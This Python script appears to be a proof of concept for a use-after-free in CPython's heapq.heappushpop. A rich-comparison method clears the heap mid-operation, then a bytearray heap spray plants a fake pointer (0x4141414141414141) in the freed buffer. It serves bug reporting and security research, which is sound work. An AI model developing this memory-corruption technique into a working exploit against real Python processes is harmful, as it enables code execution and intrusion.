import heapq
import sys

class Evil1:
    def __eq__(self, other):
        print('In Evil1.__eq__')
        # Free the list top
        heap.clear()
        
        # The list's ob_item was size 8, so 64 bytes.
        # We allocate bytearrays of size 63 (allocates 64 bytes).
        
        fake_pointer = (0x4141414141414141).to_bytes(8, 'little')
        # ob_item[0] overlaps with payload[0..7] -> 0
        # ob_item[1] overlaps with payload[8..15] -> 0x4141414141414141
        payload = (0).to_bytes(8, 'little') + fake_pointer + b'A' * (63 - 16)
        
        global spray
        spray = [bytearray(payload) for _ in range(1000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        print('In Evil2.__gt__')
        return True

# Make top a list of size 8.
heap = [[Evil1(), 0, 0, 0, 0, 0, 0, 0]]

print('Calling heappushpop...')
try:
    # item matches the length so comparison proceeds
    heapq.heappushpop(heap, [0, Evil2(), 0, 0, 0, 0, 0, 0])
except Exception as e:
    print('Exception:', e)
print('Done')
